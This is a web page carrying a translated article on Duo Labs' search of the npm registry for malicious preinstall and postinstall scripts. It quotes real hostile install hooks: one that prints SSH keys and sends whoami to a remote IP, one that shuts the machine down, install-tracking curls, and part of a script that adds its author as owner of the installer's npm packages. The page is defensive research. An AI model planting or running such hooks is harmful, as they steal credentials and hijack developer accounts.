<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The hunt for malicious npm-packages</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Last week, we talked about how a few dozen packets were found in the npm registry that steal data from environment variables. It happened in early Aug...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The hunt for malicious npm-packages</h1><div class="post__text post__text-html js-mediator-article">  Last week, we <a href="https://habrahabr.ru/company/ruvds/blog/335144/">talked</a> about how a few dozen packets were found in the npm registry that steal data from environment variables.  It happened in early August and caused a wave of interest in the safety of npm-packages.  The comments to the previous material rightly noted that the problem of unreliable packages has existed since the day of the appearance of package managers, that, although now everything is more or less calm, no one is immune from the problems of very different scale.  For example, malicious code that was introduced in the next update of some popular package can cause a real disaster.  The search for dangerous packages is not easy, they are approached from different sides.  Today we want to share with you a story about how the <a href="https://duo.com/blog/hunting-malicious-npm-packages">Duo Labs</a> staged a hunt for malicious npm-packages. <br><br> <a href="https://habrahabr.ru/company/ruvds/blog/335602/"><img src="https://habrastorage.org/web/0e9/f5c/c85/0e9f5cc85e2043d083272ceb7af89d8b.jpg"></a> <br><a name="habracut"></a><br><h2>  <font color="#3AC1EF">A couple of words about dangerous packages</font> </h2><br>  The names of newly discovered dangerous packages that steal data from environment variables were calculated on the fact that the developer will make a typo by entering the name of a known package when running the <code>npm install</code> command. <br><br>  The danger of installing such packages lies in the fact that secret keys or other important information are often stored in environment variables.  If the administrator accidentally installs such a package, everything valuable will be collected and sent to the attacker.  And, in this particular attack, the malicious packages were published as dependent on real packages with similar names, as a result, the necessary package will be installed, and the developer will most likely not notice anything suspicious. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Considering the fact that npm has some history of dealing with malicious code ‚Äî either with cracked regular packages or with those originally designed to perform some unwanted actions, we decided to analyze the entire npm repository and hunt for other malicious packages. <br><br><h2>  <font color="#3AC1EF">Trouble story npm</font> </h2><br>  The recent buzz around malware packages in the npm repository is not the first such incident.  In 2016, a certain developer canceled the publication of his npm-packages in response to a dispute related to names.  Many other packages depended on them, as a result, the cancellation of the publication led to a widespread <a href="http://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">disruption of work</a> and fears related to the possible hacking of packages by hackers. <br><br>  Here is the <a href="">material</a> that was published this year.  Here, the researcher was able to get direct access to 14% of all npm-packages (and indirect access to 54% of packages).  He either cracked weak account passwords using brute force, or used passwords obtained after hacking services that are not directly related to npm.  This led to a massive <a href="http://blog.npmjs.org/post/161515829950/credentials-resets">reset of passwords</a> in npm. <br><br>  The possible negative impact of hacked or malicious packages is exacerbated by how the npm registry is structured.  Namely, npm <a href="https://docs.npmjs.com/getting-started/what-is-npm">welcomes the</a> development of small packages that depend on many other packages.  This approach led to the emergence of a whole <a href="https://blog.graphcommons.com/analyzing-the-npm-dependency-network/">network of</a> small packages, each of which depends on many others.  In the case of the aforementioned research into the possibility of theft of credentials, the author was able to access some very popular packages, which gave him the potential to make a much larger attack on the npm ecosystem, rather than the one that would be possible, did not exist in npm so much interdependence of packages . <br><br>  For example, here is a dependency graph for the top 100 npm packages prepared by <a href="https://graphcommons.com/selections/5bc3908c-26a5-454a-8079-a3eb92e6096b">GraphCommons</a> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/59a/dc2/7ea/59adc27ea2d44b63287bd99ad12fdcdf.png"><br>  <i><font color="#999999">Graph of dependencies of npm-packages from the first hundred</font></i> <br><br><h2>  <font color="#3AC1EF">How malicious npm packages capture systems</font> </h2><br>  In the above cases of attacks on npm, ordinary developers who have no malicious intent participated.  But what if something like this is organized by an intruder?  How can he take advantage of access to other people's packages for personal gain? <br><br>  The easiest way to attack is to use the npm feature to run <code>preinstall</code> and <code>postinstall</code> .  This is how the newly discovered malicious packages were arranged.  In these scripts, there can be arbitrary system commands specified in the <code>package.json</code> package file, designed to be executed, respectively, before and after the package installation.  <b>Please note: the commands in the scripts can be any</b> . <br><br>  This feature is useful in itself.  In fact, such scripts are often used as an aid in the presence of complex package installation configurations.  However, they give an attacker access to packages that have been hacked or initially malicious.  In fact, it allows hacking systems. <br><br>  Given all this, let's analyze the npm registry in order to detect potentially dangerous packages. <br><br><h2>  <font color="#3AC1EF">The hunt for malicious packages</font> </h2><br><h3>  <font color="#3AC1EF">‚ñç Download data for analysis</font> </h3><br>  The first step in our analysis was to get information about the packages.  The npm registry is based on CouchDB ( <a href="https://registry.npmjs.org/">registry.npmjs.com</a> ) There was an endpoint <code>/-/all</code> that returned information on all packages in JSON, it all worked until this feature was <a href="http://blog.npmjs.org/post/157615772423/deprecating-the-all-registry-endpoint">turned off</a> . <br><br>  We, for our purposes, can refer to the copy of the registry at <a href="https://replicate.npmjs.org/">replicate.npmjs.com</a> .  Let's apply the same technique that <a href="">other libraries use</a> to get a copy of JSON data for each package: <br><br><pre> <code class="hljs ruby">curl <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/replicate.npmjs.com/registry</span></span><span class="hljs-regexp"><span class="hljs-regexp">/_design/scratch</span></span><span class="hljs-regexp"><span class="hljs-regexp">/_view/by</span></span>Field &gt; npm.json</code> </pre> <br>  Then we will use the tool for processing JSON <code>jq</code> and extract package names, scripts and download URLs from the received data.  This will help us such a neat one-liner: <br><br><pre> <code class="hljs 1c">cat npm.json <span class="hljs-string"><span class="hljs-string">| jq '[.rows | to_entries[] | .value | objects | {"</span></span>name<span class="hljs-string"><span class="hljs-string">": .value.name, "</span></span>scripts<span class="hljs-string"><span class="hljs-string">": .value.scripts, "</span></span>tarball<span class="hljs-string"><span class="hljs-string">": .value.dist.tarball}]' &gt; npm_scripts.json</span></span></code> </pre> <br>  In order to simplify the analysis, we, quickly, prepared <a href="https://gist.github.com/jordan-wright/6dda2e4683ba3e99c8d56cd7173c9d1f">a Python script</a> to solve the following tasks: <br><br><ul><li>  Search for packages with <code>preinstall</code> , <code>postinstall</code> or <code>install</code> <code>postinstall</code> . <br><br></li><li>  Search for files executed by the script. <br></li><li>  Search for strings found in files that may indicate suspicious activity. <br></li></ul><br><h3>  <font color="#3AC1EF">‚ñç Findings</font> </h3><br>  <b>Attack Packages</b> <br><br>  Developers have long been aware of the potential dangers of installation scripts.  One of our first finds was packages that are designed to demonstrate this problem in a seemingly safe way.  Here is a summary of these packages: <br><br><pre> <code class="hljs tex">{ "name": "maybemaliciouspackage", "scripts": {   "postinstall": "find ~/.ssh | xargs cat || true &amp;&amp; echo '<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">nOH</span></span></span></span> HEY LOOK SSH KEYS<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span>'" } }, { "name": "deasyncp", "scripts": {   "preinstall": "say U WOT M8; shutdown -s now" } }, { "name": "harmlesspackage", "scripts": {   "postinstall": "echo '<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">nThanks</span></span></span></span> for your SSH         keys :)' &amp;&amp; curl -X GET http://104.131.21.155:8043/<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">\</span></span></span></span>?<span class="hljs-formula"><span class="hljs-formula">$(whoami)" } }, { "name": "npm-exploit", "scripts": {   "install": "mkdir -p ~/Desktop/sploit &amp;&amp; touch ~/Desktop/sploit/haxx" } }</span></span></code> </pre><br>  <b>Curious developers scripts</b> <br><br>  The next thing we found were scripts that track the package installation location.  Npm provides specific download data on the package page, but some authors want more.  And this is already a violation of the privacy of users.  Here are some packages that use Google Analytics or Piwik to track installations. <br><br><pre> <code class="hljs perl">{ <span class="hljs-string"><span class="hljs-string">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"npm_scripts_test_metrics"</span></span>, <span class="hljs-string"><span class="hljs-string">"scripts"</span></span>: {   <span class="hljs-string"><span class="hljs-string">"preinstall"</span></span>: <span class="hljs-string"><span class="hljs-string">"curl 'http://google-analytics.com/collect?v=1&amp;t=event&amp;tid=UA-80316857-2&amp;cid=fab8da3e-d191-4637-a138-f7fdf0444736&amp;ec=Pre%20Install&amp;ea=run'"</span></span>,   <span class="hljs-string"><span class="hljs-string">"postinstall"</span></span>: <span class="hljs-string"><span class="hljs-string">"curl 'http://google-analytics.com/collect?v=1&amp;t=event&amp;tid=UA-80316857-2&amp;cid=fab8da3e-d191-4637-a138-f7fdf0444736&amp;ec=Post%20Install&amp;ea=run'"</span></span> } }, { <span class="hljs-string"><span class="hljs-string">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"subtitles-lib"</span></span>, <span class="hljs-string"><span class="hljs-string">"scripts"</span></span>: {   <span class="hljs-string"><span class="hljs-string">"postinstall"</span></span>: <span class="hljs-string"><span class="hljs-string">"bash -c 'curl \"http://avighier.piwikpro.com/piwik.php?idsite=3&amp;rec=1&amp;action_name=$HOSTNAME\"'"</span></span> } }</code> </pre> <br>  Such things in some packages are not so obvious.  Scripts for collecting data are hidden in the installation JavaScript files instead of being embedded in the shell commands in the <code>package.json</code> file. <br><br>  Here are some of the similar packages we found.  Links lead to the corresponding scripts: <br><br><ul><li>  <a href="https://gist.github.com/jordan-wright/6dda2e4683ba3e99c8d56cd7173c9d1f">ikst</a> <br></li><li>  <a href="https://gist.github.com/jordan-wright/6dda2e4683ba3e99c8d56cd7173c9d1f">botbait</a> <br></li><li>  <a href="https://gist.github.com/jordan-wright/6dda2e4683ba3e99c8d56cd7173c9d1f">mktmpio</a> <br></li><li>  <a href="https://gist.github.com/jordan-wright/6dda2e4683ba3e99c8d56cd7173c9d1f">anarchy</a> <br></li></ul><br>  <b>Malicious scripts</b> <br><br>  And finally, we started searching for packages whose installation scripts are malicious in nature.  When installing such packages, the user's system will be subject to very undesirable effects. <br><br>  <b>Mr_robot case</b> <br><br>  While examining the remaining packages, we came across an interesting installation script in the <code>shrugging-logging</code> package.  It is arranged very simply.  The package adds a set of ASCII characters <code>¬Ø_(„ÉÑ)_/¬Ø</code> (the so-called shrug - emoticon shrugging) to the log messages.  However, this package has a very unpleasant <code>postinstall</code> script, which gives the author of the package ( <code>mr_robot</code> ) the right to manage npm-packages owned by the one who ran <code>npm install</code> . <br><br>  Here is the corresponding code snippet.  The full text of the function can be found <a href="https://gist.github.com/jordan-wright/6dda2e4683ba3e99c8d56cd7173c9d1f">here</a> . <br><br><pre> <code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">currentUser</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">cb</span></span></span><span class="hljs-function">) </span></span>{ exec(<span class="hljs-string"><span class="hljs-string">'npm whoami'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">err, stdout, stderr</span></span></span><span class="hljs-function">) </span></span>{   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!err) cb(stdout); }); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addOwner</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">packageName, newOwner</span></span></span><span class="hljs-function">) </span></span>{ exec(<span class="hljs-string"><span class="hljs-string">'npm owner add '</span></span> + newOwner + <span class="hljs-string"><span class="hljs-string">' '</span></span> + packageName); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getModulesOwned</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">user, cb</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">'https://www.npmjs.org/~'</span></span> + user; request(url, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">error, response, 